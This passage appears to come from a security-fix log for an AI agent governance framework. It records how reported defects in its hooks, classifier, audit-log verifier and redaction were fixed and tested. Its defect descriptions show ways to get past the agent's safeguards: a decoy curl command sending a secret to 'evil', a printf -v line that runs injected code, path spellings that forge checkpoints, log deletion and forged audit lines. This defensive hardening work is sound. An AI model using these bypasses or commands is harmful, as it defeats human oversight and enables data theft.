  name is not registered, whatever the listed tool, since the tool that runs
  under an unregistered name may be one that sends anywhere (§4.4.2,
  §5.18.10's "a call of an unbound tool, which may send anywhere"). With no
  policy in force, a name listed for a grounded tool needs no registration:
  the tool that runs checks itself if it is grounded, and a plain tool that
  runs is a plain tool's call, which the statement does not cover (stated as
  a host gap). Not taken: running the listed object's `execute` directly
  (it would bypass the runtime's argument parsing, `uses` and hooks), and a
  witness on the listed object (it would detect a mismatch only after the
  other tool had run).
- Tests: `refuses a nested plain call when no tool is registered under its
  name` (the reported probe), `... when the tool registered under its name
  is not the one listed`, `refuses a name registered with two different
  tools`, `refuses an invocation of a name listed for a grounded tool when
  another tool is registered under it` (the sibling, registered), `refuses,
  under a destination policy, an invocation of a name listed for a grounded
  tool that no tool is registered under` (the sibling as reported; it runs
  once registered as the listed tool, and with no policy), the control
  `runs the nested call where the registered tool is the one listed`, and
  `validates what registerTools is given`.
- Tests changed to the new behaviour: the relay tests of round 1 #27
  register `notify`; `test/layer.test.ts`'s composite-profiles test
  registers its tools (its profiles put a policy in force); the call
  fixtures' runner registers each tool it builds under the name the memory
  thread runs it under, as a deployment does.

#### Documentation

The binding's statement (`covers`: nested calls through `invokeTool` to a
plain tool registered as the one listed; `does_not_cover`: a plain tool the
runtime runs under a name listed for a grounded tool; a new host gap on
`registerTools`), SECURITY.md's binding paragraph, the Standard Agents
guide (composites: the list on both routes, plain tools' checks, the tool
the runtime runs, queued calls; the guarantees row; the conformance
paragraph, with its stale fixture counts corrected to 35 and 32), the
binding README (the F504 and R402 rows, `registerTools`), the doc comments
of `grounded.ts` and `layer.ts`, and CHANGELOG [Unreleased] Upgrading (the
binding's composites and plain tools). The Standard's text was not
changed: §5.18.4 already says every other check applies to a nested call,
that the binding run under a listed name need not be the one listed, and
that a call made through the composite once its call has ended is checked
as a call of its own or refused; §5.18.10 already requires the persist,
audit and output rows of every covered call and refusal under a policy of
a call that may send anywhere. No version changes.

#### Checks after batch 5

- TypeScript: the binding's check and test (233 passed, 2 skipped; 217
  before the batch, plus the 16 new tests); `packages/acs-core` build (no
  source changed; the WebAssembly build reused), check and test (2002).
- Python: `pytest tests/` (5967 passed, 18 skipped; no Python source
  changed); every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; `sync_skill_schemas.py --check` and the generators' `--check`
  (the call fixtures unchanged); `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun.
- Site: `npm run check`, `npm test` (1173). The Standard did not change and
  the Standard Agents guide is not in the figure-gap sweep's enforced scope.
- Old code: the three test files run with fb50354's `grounded.ts` (above):
  14 failed, the controls passed.
- Probes, each under `timeout 120` with the heap bounded (a 4 GB
  address-space limit stops vitest's workers, which reserve more), inputs
  of at most 1 MB: the reporters' five (`p1_plain_persist`,
  `p2_queue_tool`, `p3_plain_output`, `p3b_plain_confidence`,
  `p5_plain_name`) and the verifiers' five (`v18`, `q_queue`,
  `v3_contract_grounding`, `p5b_siblings`, `p5c_pointer`), pointed at this
  worktree, twice: as written (no `registerTools`), and with a memory thread
  that registers each tool the runtime runs under its name, as a faithful
  deployment does. In both runs no secret was stored, nothing was sent to a
  host the policy does not allow or queued past the composite, no
  checkpoint that saved nothing let a rollback run (F503 after it), and the
  low-confidence and contract-breaking nested outputs were refused (F504,
  R402); the registered run reached each specific check (F504 secret, R402,
  F504 confidence, the mismatch refused, an allowed send run), the
  unregistered run refused the plain calls for want of registration and
  the verifiers' sibling A under its policy. Timing: a nested plain persist
  and retrieve with 1 MB of data and output, 63 ms. No CLI or nested agent
  was started; nothing was left running; the probe directory's
  `node_modules` link and vite cache were removed.

### Batch 6: four reported defects

Four defects, each reproduced by an independent verifier on bfb18b1: the
binding's record of one refusal, the core's diagnostics and the runner's
redaction of a host's anchors, the plugin hook's persist row, and the audit
log verifier. None was fixed by an earlier batch: git log, round 1 (#43
covered a tool's `secrets` function as a source of redaction values, not
its failure; #34 and #36 redacted the runner's own `Error`s, not the core's
diagnostics or an `Output`; #39 anchored the log's end, not its lines' bytes)
and round 2 batches 1 to 5 checked, and each reported route reproduced on
102d310 before its fix. Each fix has tests that fail on the code before it
(below, per defect, with the controls that pass on both).

#### 22. A grounded call refused because its secrets function failed (R407) was not recorded (low)

`execute` read the tool's `secrets` (`secretsOf`) before `check` and, when
the function threw, returned the R407 refusal straight away: no trace entry,
no `recorded_by`, so the audit hook wrote its own entry for the call
(`capability: null`, `failed`, no code). §5.18.8 records each call a layer
refuses. Fail-closed held: the tool's code never ran.

- Fix (`examples/standard_agents/src/acs/grounded.ts`): that path appends a
  `refused` entry with code R407, the call's identity (tool, capability,
  domain, position, `person_required`; now `identityOf`, shared with
  `check`), the arguments' digest when they have one, and `recorded_by`,
  under `serially`, redacted with the secrets the layer holds
  (`layerSecrets()`: the layer's and those tools registered, plus the
  default patterns). A record the store refuses leaves the call refused
  (`.catch`), as `check`'s own R407 path does. `refused`, not `failed`: the
  call never started, as the R407 for changed layer profiles is recorded.
- Tests (`test/evidence.test.ts`): `refuses and records a retrieve|mutate
  call whose secrets function fails (R407, §5.18.8)`: one `refused` R407
  entry with `recorded_by` (name, version, config digest) and the args
  digest, the layer's secret in the thrown message redacted, the tool's code
  not run, and the audit hook linking that entry (`tool_call_id`) instead of
  writing one. Both fail on 102d310's `grounded.ts` (no entry).
- Sibling: the Python adapter's secrets are values (`secret_values`), never
  a function that can fail; `controlTool` and `memoryTools` read no secrets
  function. None to fix.

#### 23. The core's F505 diagnostic copied an anchor's ref (a presigned or signed URL) into the trace, result, run record and snapshot (medium)

`grounding::check` built its F505 messages with the anchor's `ref`
(`evidence_anchors[0] cites 'https://...&X-Amz-Signature=...'`), and the
executor put the message in `step_failed`/`run_failed`, `RunResult.message`,
the run record and the snapshot; nothing redacts the core's own diagnostic,
and the runner submitted an `Output` unredacted, so a registered secret
leaked too. The other `acs:` messages did the same; the TypeScript port
(`packages/acs-core/src/evidence.ts`, which the binding's grounding check
uses) said the same.

- Fix, core (`core/src/grounding.rs`): every message names the anchor by
  its index and kind (`evidence_anchors[0] (kind 'url') cites a ref the
  host's evidence_seen does not list`; an `acs:` anchor "whose rest is not a
  reference body", "cites a workflow value that no reference bound ...
  covers"), as the destination refusal (`exec/machine.rs`) leaves the
  destination out. A kind is named only when it is one of §6.5's; a vendor
  kind is "a vendor (x-) kind", anything else "a kind outside §6.5's
  vocabulary", since a kind is host text too.
- Siblings, core: the same rule for every value of a host's output a
  diagnostic repeated. `inference_method` outside the vocabulary is no
  longer quoted; a confidence that is not a number from 0 to 1 is named by
  `grounding::shown_value` (a number, a boolean or null as it is, anything
  else by its type: `(a string)`), in the grounding message, the contract
  check (`contract_value_problem`, R402: it showed 64 characters of the
  value) and the minimum-confidence fault (`ConfidenceFault::Invalid`, F504
  `invalid_confidence`: the same 64 characters). Checked and left: the
  memory-scope mismatch names the scope the step bound and the one returned
  (scopes are names, §4.5), and the delegation identity errors name no
  value of the output beyond its member names.
- Fix, TypeScript: `checkGrounding` and the binding's `confidenceFailure`
  say what the core says; `@synaptiai/acs-core` exports `shownValue`.
- Fix, runner (`grounded_agency/workflows/runner.py`,
  `_redact_anchors`): every `Output` is submitted with each evidence anchor
  that holds a secret redacted by the runner's `redactor`
  (`redact_anchor_data`, registered secrets included: the ref, excerpt and
  metadata replaced, the digest dropped with `digest_omitted: secret`), so
  the run's state, outputs, trace and snapshots never hold it, an accepted
  output's included. `evidence_seen` is rewritten to match: each anchor's
  redacted ref is listed when its own ref was; when two anchors are one
  after redaction (two signed URLs differing in the signature) it is listed
  only when both were, so an anchor the host did not list never passes as
  seen (fail closed; with `evidence_seen` given, an unlisted anchor fails
  F505 either way, so no outcome changes). A `seen` that is not a list of
  strings is left for the core to refuse. Not taken: redacting the core's
  message after the fact (the trace and snapshot are the core's, and the
  message would still be built from the raw ref).
- Tests: Rust `grounding::tests::messages_never_repeat_what_an_anchor_cites`
  (three credential-bearing refs under three kinds, four `acs:` forms, a
  string confidence and method), `messages_say_why` changed to the new
  wording (it asserted the quoted method and confidence), and
  `profile::tests::confidence_checks` changed likewise (it asserted the
  64-character cut; it now asserts each type's name and that the message
  holds no key): the three fail on 102d310's `grounding.rs` and
  `profile.rs`. TypeScript `grounding messages repeat nothing an anchor
  cites (§6.7)` (5 tests; all fail on 102d310's `evidence.ts`, with a stub
  for the new export), and the binding's `applies the minimum confidence as
  the core does` (the message names the type). Python
  (`tests/test_runner_evidence.py`): `test_no_secret_from_an_anchor_in_a_step_refused_with_f505`
  (the reported probe: S3 presigned, Azure SAS and userinfo refs, with the
  default redactor and with the secret registered: trace, message, outputs,
  action records, run record and snapshot hold neither the signature nor
  the key id; 102d310's core leaks with the default redactor),
  `test_an_accepted_anchor_is_kept_redacted_and_still_attested` (the host
  lists the anchor: the attested policy passes and the outputs hold the
  redacted anchor without its digest; fails on 102d310's runner), and the
  control `test_anchors_one_after_redaction_are_attested_only_when_both_were`.
- Not changed: the default patterns do not recognise a signed URL's
  signature (`sig=`, `X-Amz-Signature=`, `X-Goog-Signature=`); a
  `X-Amz-Credential` key id, a URL's userinfo password and `api_key=` are.
  How a host recognises secrets is its choice (§6.7); the F505 path no
  longer depends on it, and the guide says how to add a pattern. Widening
  the defaults would change the Python, TypeScript and shell redactors and
  the shared vectors together, a change of its own.

#### 24. The plugin's pre-tool-use hook let TodoWrite, TaskCreate and TaskUpdate (persist) store a credential (medium)

The three are on `UNGATED_TOOLS` (persist needs neither a checkpoint nor
approval), and the hook exited 0 for them before any check: §5.18.10's
persist row (no secret the layer recognises, F504, decided by code) was
never applied, although the plugin holds the scan and the SDK adapter
refuses the same calls.

- Fix (`hooks/pretooluse_require_checkpoint.sh`): `PERSIST_TOOLS=(TodoWrite
  TaskCreate TaskUpdate)`; before the ungated exit, a call of one is blocked
  with `F504 CONSTRAINT_VIOLATED: <tool> (persist): ...`, in every
  permission mode, when its input holds a secret as the adapter decides it
  (`Redactor.holds_credential`): the shared scan (`secret_scan.sh`, copied
  between its BEGIN and END lines) over every string of `tool_input` and
  over its JSON text, and the SDK redactor's rule for data
  (`SECRET_MEMBER_JQ`, a jq port of `_secret_member_value`: a value of 4 or
  more characters other than `[REDACTED]`, or a number, that is not a
  placeholder, under a member whose name ends in a credential's or names
  `Authorization`/`Cookie`, as the value of such a name/value pair, or the
  second of such a `[name, value]` tuple). Input jq cannot read is R407.
  The scan runs with pipefail off: a `grep -q` that stops at a match ends
  the `printf` feeding it, which pipefail would read as no match. jq folds
  case by Unicode where the SDK folds ASCII only, so the hook finds a
  credential name in rare spellings the SDK does not, never the reverse.
- Tests (`tests/test_pretooluse_hooks.py`, `TestShellHookPersistSecrets`):
  the reported payload for each tool in `default` and `bypassPermissions`
  (F504, nothing written); the hook's verdict equal to the adapter's on 20
  inputs (text and data forms, placeholders, prose, the marker) and on the
  55 credential vectors that register no value (each also equal to the
  vector's `holds`); 1 MB of todos before an AWS key refused in under 5 s
  (0.17 s measured; 0.37 s for 1 MB with no secret, 0.07 s for 100 KB).
  `test_the_pre_tool_use_hook_copies_the_secret_scan`
  (`tests/test_skill_hooks.py`) keeps the copy equal to the file, and
  `test_persist_tools_are_the_ungated_tools_the_mapper_says_store`
  (`tests/test_hook_lists_match_mapper.py`) keeps the list the mapper's.
  On 102d310's hook, 21 of the 30 fail; the 9 that pass are the inputs both
  layers allow (controls).
- Siblings checked: no other tool on `UNGATED_TOOLS` maps to `persist` or
  `audit` (the list test says so); the persist skill's hook covers file
  writes, the audit skill's its records file.

#### 25. The audit log verifier checked a line's parsed content, not its bytes (low)

`verify_entry` took the HMAC over `json.dumps(json.loads(line) minus
hmac)`. JSON that names a member twice parses to the last value at the
first name's place, so without the key a line could be edited
(`"status":"executed","status":"failed","tool":"Read","tool":"Bash"`) to
read as an executed Read to grep or a reader that keeps the first, and
still verify; a forged earlier `hmac` member, a forged `details` before the
real one, blanks and `\u` escapes passed too.

- Fix (`tools/verify_audit_log.py`): `verify_log` checks each line with the
  new `verify_line`, as the bytes the hook signed: parsed with a
  duplicate-refusing `object_pairs_hook` (at any depth); the line must end
  with `,"hmac":"<64 hex>"}` (jq -c appends it last, in every generation:
  git history checked), must equal the compact re-serialisation of what it
  parses to (so no blank, escape or number form differs), and the HMAC is
  taken over the line with that suffix replaced by `}`. A line refused for
  a duplicate still hands the chain the hmac it ends with, so only that
  line is reported. Lines are no longer stripped: blanks around a line
  fail, and a blank line is reported (the hook writes none) and counted, as
  the hook's head counts lines. `verify_entry` still checks a parsed entry
  (the audit skill's tests use it) and says it cannot see bytes.
- Tests (`tests/test_verify_audit_log.py`, `TestTheBytesSigned`, on lines
  the hook writes with `AUDIT_HMAC_KEY` set): the reported edit, a forged
  leading `hmac`, forged `details` before the real ones, a member named
  twice inside `details`, a blank and two `\u` escapes inserted, the `hmac`
  moved first, a blank before the first line, and a blank line between two
  entries: all 10 fail on 102d310's verifier. The 182 existing verifier,
  hook and pipeline tests pass unchanged (every line the hook writes
  verifies).
- Sibling: the log hook reads its last line's `hmac` with jq (last wins);
  with hmac last and duplicates refused by the verifier, that is the value
  the verifier continues the chain from, so the two agree. The audit
  skill's chain is verified by the same `verify_log` (`--no-head`).

#### Documentation

SECURITY.md (§1.5: the runner's anchor redaction and the core's
diagnostics; the plugin hook's persist row; the log's byte-level check),
hooks/README.md (the persist row, the shared scan's third copy, the
verifier), the running-workflows guide (the runner's `redactor`, the F505
message, the signature patterns), the Standard Agents guide (the R407
record), the acs-core README (`shownValue`), the hook's header, and
CHANGELOG [Unreleased] Upgrading (the runner, the core's diagnostics, the
plugin hook and verifier, the binding's record). The Standard's text was
not changed: §6.7 already forbids a secret in a diagnostic, a trace and a
record, §5.18.8 already records each refusal, and §5.18.10 already requires
the persist row of every layer. No version changes.

#### Checks after batch 6

- Python: `pytest tests/` (6017 passed, 18 skipped; 5967 before the
  batch), and again the five test files changed after the last doc edits
  (1401 passed); ruff check and format with CI's lists; mypy; every
  `tools/validate_*.py` of CLAUDE.md, `validate_workflows.py --strict` and
  every domain catalog and example `--strict`; `sync_skill_schemas.py
  --check` and the generators' `--check` (no fixture or vector changed: the
  vectors do not compare messages); `scripts/run_conformance.py`.
- Rust: `cargo fmt --check`, `cargo clippy --all-targets` with no
  features, `python` (against the worktree's interpreter) and `wasm`, all
  `-D warnings`; `cargo test` (all binaries pass; 258 unit tests) and
  `cargo test --features wasm --test wasm` (13). The extension was rebuilt
  (`uv pip install -e`) and the WebAssembly core rebuilt into
  `packages/acs-core/dist/` once, after the Rust change; no other copy was
  built.
- TypeScript: `packages/acs-core` build, check and test (2007; 2002 plus
  the 5 new); the binding's check and test (235 passed, 2 skipped; 233 plus
  the 2 new).
- Site: `npm run check`, `npm test` (1173).
- Old code: each fix's tests run against 102d310's file (above, per
  defect): the binding's 2, the Rust 3, the TypeScript 5, the runner's
  accepted-anchor 3 and F505 cases, the hook's 21 of 30 and the verifier's
  10 fail; the rest are controls.
- Probes, each under `timeout 120` and a 4 GB address-space limit, inputs
  of at most 1 MB: the reporter's F505 probes (`p2/f505.py`,
  `p2/f505_registered.py`) pointed at this worktree (F505 still, and the
  trace, message, run record, snapshot and store hold neither the key id
  nor the signature, registered or not; the attested run passes); the
  hook repro for the three tools (exit 2, F504) and the clean todo (exit
  0); a 16-input comparison of the hook and the adapter (all equal); the
  hook's timing at 100 KB and 1 MB (0.04 to 0.37 s). No CLI or nested
  agent was started; nothing was left running; the probe copies and the
  scratch project were removed.

## Round 3

### Batch 1: five reported defects

Five defects, each reproduced by an independent verifier on 6004f78: one in
the SDK classifier's reading of a line of read-only commands, two in what
the records guard reads (the paths the shell reads differently from their
text, and every argument of a tool other than Bash, Skill and the file
tools), one in what git reads let the repository run, and one in the audit
log's end. None was fixed by an earlier batch (git log and rounds 1 and 2
checked; round 2's fixes hold: their tests pass unchanged, and round 2 #4's
link resolution is the base the new reading extends). Each fix has tests
that fail on the code before it: the 184 tests of the three new files and
the new `TestAnchor` were run with 6004f78's three hooks, mapper, recorder
and verifier put back, and 145 failed; the 39 that passed are the
fixtures' own checks (bash runs code through `printf -v`; a delivered
config and a `post-index-change` hook run their programs), the controls
(other paths asked, `printf` without an option, a plain repository, the
user's own configuration, git's own fsmonitor, `~/` and the Monitor and
PowerShell commands the old guard read already) and two timing bounds.

#### 1. The records guard read `~+`, `~-`, `~user` and a path attached to a short option as written (low); sibling: the command a quoted word holds

`path_words` rewrote only a word opening with `~/`, and a path glued to a
short option (`-tnotes/k`, `-onotes/todo.md`) stayed one word resolved as
`<cwd>/-tnotes/k`. `cp -r fixtures/key fixtures/commits ~+/notes/k/` (with
the shipped link `notes/k -> ../.git/acs/checkpoints`) was only asked,
and, once approved, replaced the key and entered a forged commit: every
later restore of the repository's commit M ran with no checkpoint and no
approval. Sibling, not reported and not in SECURITY.md's "not seen" list:
`sh -c 'cp -r fixtures/key fixtures/commits notes/k/'` was read as one
word, `cp -r ... notes/k/`, resolved as a single path.

- Fix (`word_candidates`): each word is resolved as written and, for a
  word opening with `~`, as the shell expands it (`~`, `~/`: `$HOME`; `~+`:
  the call's directory; `~name`: that user's home, by the shell's own
  lookup on a name of `[A-Za-z0-9._-]` only); `~-`, `~N`, `~+N`, `~-N`
  (the shell's previous directory, its directory stack, which the hook
  cannot know) and a `~` followed by a name no user can have are refused
  (F504). A word opening with a single `-` is also resolved from each
  place a short option's value may start (the second character up to the
  first that is not a letter or digit, which covers `-rtdir`). Both
  readings are checked, so a quoted `'~+'` (which the shell leaves as
  written) is not missed either way.
- Fix (`add_words`): a word that holds a blank, a quote, a backslash or an
  operator once dequoted (the text a shell reads again: `sh -c`, `ssh`,
  `git -c alias.x='!...'`, `find -exec sh -c`) is read again with
  `path_words`, and a word that still holds one at that level is split at
  every blank, quote and operator.
- Bounds: every resolution counts its path's bytes against a budget of
  262144 per call (`RESOLVE_LEFT`, beside the 200-link budget), so a
  4000-letter option cluster is refused in 0.4 s, not resolved 4000 times;
  a word with no slash that is no link resolves to itself without the
  function (most words); the resolved paths are kept in an array (appending
  to one string copied it whole each time, which made a 150 KB input take
  15 s).
- Tests: `TestShellExpandedPaths` in `tests/test_records_guard.py` (the
  reported spellings, `~/` with `HOME`, `~user` by the path from that
  user's home, which fails when read as written; `~-`, `~1`, `~+2`
  refused; six nested commands; seven controls asked; the verifier's chain
  ends at the refused copy; a 4000-letter cluster in bounded time).

#### 2. The records guard never read an MCP tool's arguments (medium)

`call_text` came only from Bash, Monitor and PowerShell `.command`, a file
tool's path and Skill `.args`; every other tool gave null, so
`mcp__filesystem__write_file {"path": ".git/acs/checkpoints/key"}` and a
filesystem server's path through a shipped link were only asked.

- Fix (`RECORD_TEXTS_JQ`): the texts read are a file tool's path (read
  whole), a Bash command and a Skill call's arguments (read as words), and,
  for every other tool but Agent and Task, every string and every member
  name of the input, read whole and as words, since the hook cannot know
  which the tool takes for a path or a command. Agent and Task are not
  read: a subagent's own calls come to the hook, and reading prompts would
  refuse prose. The records regex and the lexical reading apply to every
  text; texts of at most 4096 bytes are resolved (a longer one cannot be a
  path that opens, and is a command not read, as a Bash command over 4096
  bytes is). More than 65536 bytes of such texts in one call is refused
  (F504): reading strings that each hold quoted words costs about 0.2 s per
  4 KB here, and 64 KB of them took 3.0 s, within the hook's 30 s limit on
  a slower machine.
- Not changed: a text over 4096 bytes is still not read for paths (a Bash
  command or a shell server's command padded past it), as SECURITY.md
  states; it is a `mutate` a person approves.
- Tests: `TestEveryToolsArguments` (eleven inputs refused: literal records
  in three filesystem calls, paths through links, `~+`, a shell server's
  command and argv, a member name, Monitor, PowerShell; four asked; the
  65536-byte refusal within 10 s; the slowest reading under the budget
  within 25 s; a 5 KB string not read).

#### 3. git reads and `git stash create` ran programs the repository's own configuration names (medium); siblings: hooks, a recorded restore, the clean-tree checks

`git_read_gated` checked only a promisor, a partial clone and submodules,
and `git_dir_is_made` trusts any `*/.git` by name. A project delivered with
its `.git` (an archive, a copied checkout), or one approved `git config
core.fsmonitor ./x`, makes `git status`, `git diff`, `git log -p`, `git
show`, `git ls-files` and `git stash create` run the repository's program
as `observe` or `checkpoint`, with no checkpoint and no approval, in the
plugin hook and the SDK mapper alike. Siblings: a `post-index-change` hook
in the delivered `.git/hooks` runs on `git status` (verified: it ran once);
a recorded restore (`git stash apply <id>`, allowed with nothing) runs the
smudge filters and merge drivers; the take hook's and the SDK recorder's
clean-tree check (`git diff --quiet HEAD`) ran the clean filter (verified
with a sentinel).

- Fix (hook `git_runs_configured`, mapper `git_config_may_run`, the same
  pattern `GIT_PROGRAM_KEYS` / `_PROGRAM_CONFIG`): `git config
  --show-scope --get-regexp` of `core.fsmonitor` (unless a boolean),
  `core.pager`, `pager.*`, `diff.external`, `diff.*.textconv|command`,
  `filter.*.clean|smudge|process`, `merge.*.driver`, `gpg.program`,
  `gpg.*.program`, in the local or worktree scope (an included file is
  reported with the scope of the file that includes it, checked), or a
  `post-index-change` in the hooks directory `git rev-parse --git-path
  hooks` names; a lookup git cannot answer is a yes, no repository a no.
  The user's own configuration (global, system, command line) is not
  repository content and gates nothing, so a global git-lfs filter changes
  nothing.
- Where it answers yes: a git read is gated (hook: `mutate`; mapper: the
  worst case), a recorded restore is a gated `mutate` in both, and `git
  stash create` is, in the hook, put to a person with no marker asked for
  (`checkpoint-ask`: only that command makes a marker, so requiring one
  would leave such a repository with no checkpoint ever; F502 in a mode
  that asks no one), and in the mapper `checkpoint` with the worst case
  beside it (`checkpoint`, `execute`, `send`: a host takes the first
  checkpoint with `create_checkpoint`, and a destination policy refuses
  it, since the program may send anywhere).
- Fix (clean-tree checks): the take hook and `_tree_is_head` turn each
  filter the local or worktree configuration names off (`-c
  filter.<name>.clean=` and the like: an empty command is no filter,
  verified); a name holding `=` or a listing git cannot give writes no
  marker.
- Why not the reporter's per-key value checks for every key: a pager runs
  only on a terminal and the signature program only with
  `log.showSignature`, but the hook cannot tell how the command it allows
  will run; naming the key is enough to gate.
- Tests: `tests/test_git_config_programs.py` (the fixture's programs run
  under plain git; 7 configurations × 8 reads refused F501 in the hook with
  no program run, and the worst case in the mapper; `git stash create`
  F502 in bypassPermissions and asked in default with no marker used; a
  recorded restore F501; an included file and a `post-index-change` hook
  count; git's own fsmonitor values and the user's global configuration
  gate nothing; the mapper's classes for create and restore, its lookup
  answering as the hook does, and a failed lookup a yes; the take hook and
  the recorder run no filter and still write a clean marker, and none over
  a changed tree).

#### 4. `rm -rf .claude` removed the audit log with its head, and the next line began a log that verifies (low)

The records patterns matched `audit.head` and `.claude/checkpoints` but not
their directory, and the log hook took no log and no head for a new log.

- Fix (guard): a path that resolves to the project's `.claude` or to its
  git directory's `acs/` (compared as resolved, in any letter case) is
  refused (F504): `rm -rf .claude`, `mv .claude x`, `rm -rf lnk/` (a link
  to `.claude`), `cp -r x/. .claude/`, `sh -c 'rm -rf .claude'`, `rm -rf
  ~+/.claude`, and an MCP move of `.claude`. Another `.claude` (`~/.claude`,
  `other/.claude`) and a path under it are not.
- Fix (anchor): the log hook keeps the same head in the project's git
  directory, `<git dir>/acs/audit.head` (only in a git directory git made
  for a work tree, the directory created with mode 700 and not through a
  link: a link there, or a directory it cannot make, is reported at each
  call, exit 1), and checks the log against both before it appends: a log removed
  with its head (`git clean -fdx`, which names nothing, removes `.claude`
  whole) is a cut, reported (exit 1), with neither head moved, at every
  later call. `tools/verify_audit_log.py` checks the anchor where it exists
  (`--anchor-file`, by default `<git dir>/acs/audit.head` for a log in
  `<project>/.claude/`, a `.git` file's `gitdir:` followed); after such a
  removal the default run fails on "Head not found" and on the anchor.
- Not changed: outside a git repository there is no anchor, and a command
  that removes both `.claude` and the git directory's `acs/` without naming
  them (a pattern) removes all three; SECURITY.md §5.5 says so.
- Tests: `TestTheDirectoryThatHoldsThem` (eight commands and an MCP call
  refused, three paths asked) and `TestAnchor` in
  `tests/test_verify_audit_log.py` (the anchor equals the head; `rm -rf
  .claude` and `git clean -fdx` each leave a log the hook and the verifier,
  by default and with `--head-file`, report, at every later call; moving
  all three aside starts a log that verifies; an anchor behind the log
  still anchors it; a link at `acs/` is written through by nothing and
  reported; no anchor without a git directory).

#### 5. `printf -v` (an allow-listed builtin) set shell variables, so a line of read-only commands ran code as `observe` (high)

The mapper classifies each simple command of a line on its own, and
`printf` was read-only whatever its arguments. `printf -v y
'a[\044(echo PWNED > f)]' && printf -v 'z[y]' 1` ran its command
substitution through arithmetic subscript evaluation (a `%s` with `$` does
the same, so blocking octal escapes alone would not close it); `printf -v
PATH . ; ls` ran a shipped `./ls`; `printf -v HOME . && git status` made
git read the repository's `.gitconfig` and run its fsmonitor. The adapter
allowed all three with no checkpoint, no person and no destination check.

- Fix (mapper `_writes`): `printf` writes when its first argument starts
  with `-` (`-v NAME`, `-vNAME`, `--`), and `printf` joins
  `_ARGUMENT_WRITERS`, so a word bash expands (which may become `-v...`)
  makes it write. The line takes the worst case (`mutate`, `send`).
- Fix (hook `writes`, kept a subset of the mapper's rules): the same, so
  the two agree; the hook read only lines of one command already, where a
  lone `printf -v` is harmless, but a test keeps the rules alike.
- Tests: `tests/test_shell_state.py` (bash runs each reported line's code;
  15 lines and single commands take the worst case in the mapper, three
  forms without an option still observe; `_writes` itself; the adapter's
  F501 without a checkpoint, the ask with one, and F504 under a destination
  policy; the hook's F501 and ask for six forms, and its pass for three).

#### Siblings checked

- Round 1 and 2 fixes hold: the quoted and abbreviated git options, the
  bounded word splitter (a 4096-byte line still splits in bounded time), the
  read-only allowlist's exclusions, round 2 #4's link resolution (its
  tests pass unchanged), the shipped `.claude` git directory and embedded
  git directories (their tests pass unchanged).
- Other read-only builtins: `echo`, `pwd` and the rest of the list set no
  shell state; `read`, `declare`, `let`, `test -v`, `[[ ]]`, `getopts`,
  `mapfile`, `unset` are on no list.
- The TypeScript package and the binding classify no shell command and run
  no git. The rollback skill's hook still allows a restore of a recorded
  commit (its check is unchanged); the pre-tool-use hook now gates that
  restore where the repository names a program git runs.
- The log hook's git lookup for the anchor runs with `core.fsmonitor` and
  hooks off and no fetch, as `hgit` does.

#### Documentation

SECURITY.md §5.1 (the Bash read-only rule and `printf`; git reads and
restores where the repository's own configuration or hooks name a program,
`git stash create` put to a person; the records guard's texts, expansions,
nested commands, the directory that holds the records and the 65536-byte
bound; the audit head's anchor), the §5.4 table row and §5.5 (the records
gap, the anchor's limit; the adapter's classifier), `hooks/README.md` (the
same, and the verifier's `--anchor-file`), the three hooks' header
comments, the mapper's docstrings, `docs/integrations/claude_agent_sdk.md`
(the Bash table: `git stash create` and git reads where the repository
names a program, `printf` with an option), and CHANGELOG [Unreleased]
Upgrading (the SDK's Bash entry; the plugin's records, git and audit log
entries). No version changes.

#### Checks after batch 1

- Python: `pytest tests/` (6200 passed, 18 skipped), and again the log
  hook's and the skill hooks' test files after the last hook edit (255 and
  1099 passed); ruff check and format with CI's lists; mypy; every
  `tools/validate_*.py` of CLAUDE.md, `validate_workflows.py --strict` and
  every domain catalog and example `--strict`; `sync_skill_schemas.py
  --check` and the generators' `--check` (no fixture or vector changed);
  `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun and no core
  was rebuilt.
- TypeScript: `packages/acs-core` build, check and test (2007; the
  WebAssembly build reused); the binding's check and test (235 passed, 2
  skipped). No TypeScript source changed: neither classifies shell
  commands nor runs git.
- Site: `npm run check`, `npm test` (1173). The run sweep was not run: of
  the enforced pages only `/guides/claude-agent-sdk/` changed, and only by
  rows of its Bash table (a figure).
- Old code: the 184 new tests run with 6004f78's three hooks, mapper,
  recorder and verifier put back: 145 failed (above, per defect).
- Probes, each under `timeout 120` and a 4 GB address-space limit, inputs of
  at most 1.2 MB: every reported spelling against the final hook (F504;
  the controls asked); the MCP calls of #2 (F504); the hook's time on a
  4000-letter option cluster (0.38 s, refused), 15 strings of 4 KB of
  quoted words (3.0 s, asked), about 60 KB of slashed words (2.4 s), inputs of
  174 KB and 1.2 MB of short strings (refused in 0.47 and 0.75 s) and one
  1 MB string (0.22 s, not read for paths). No CLI or nested agent was
  started; nothing was left running; the scratch repositories and inputs
  were removed.

### Batch 2: five reported defects

Five defects, each reproduced by an independent verifier on 6004f78 and
reproduced again here on 3ecf6aa (batch 1's commit) before any change: four
in the SDK's Bash classifier and one in the persist skill's command hook.
None was fixed by an earlier batch (git log and rounds 1 to 3 checked; batch
1's tests pass unchanged but for three expectations made stricter, below).
Each fix has tests that fail on the code before it: the 119 tests of
`tests/test_bash_program_words.py` run with 3ecf6aa's mapper put back (a
stand-in `git_change_may_run` added so the module imports) gave 82
failures, and the new persist tests with 3ecf6aa's `skills/persist/SKILL.md`
gave 14; what passed is the fixtures' own checks (GNU sed's `e` runs a
command, `docker rm` asks the daemon `DOCKER_HOST` names, `git reset`
fetches in a partial clone, the hooks a change runs, bash runs two commands
in GBK and BIG5, `pip show *` writes the log a file name names), the
controls and the plugin hook's agreement.

#### 1. Text in an argument narrowed the class: a decoy dropped `send`, so a destination policy was skipped (high)

`_classify_single_command` matched its patterns against the words joined by
blanks, quoted arguments included, and the first match set the class.
`_DESTRUCTIVE_PATTERNS` was anchored only in its first alternative, so
`curl -s https://evil/c?k=SECRET -A 'git reset'`, `wget ... --header 'X:
sed -i'`, `bash -c 'curl ...' x 'git clean'` and `node exfil.js 'docker rm'`
were `mutate` alone: with approvals off and a destination policy in force
they ran (the adapter checks a Bash call against the policy only when its
class holds `send`), and with approvals on they were put to a person as
`mutate` instead of refused (F504). Its `\|\s*(rm|tee|dd)\s` alternative
could match only quoted text (unquoted pipes split the line). The same held
for the interpreter pattern (`rm -rf x 'python3 -c '` was `execute` and
`send`, without `mutate`) and the network pattern (`rm -rf x 'ssh h'` was
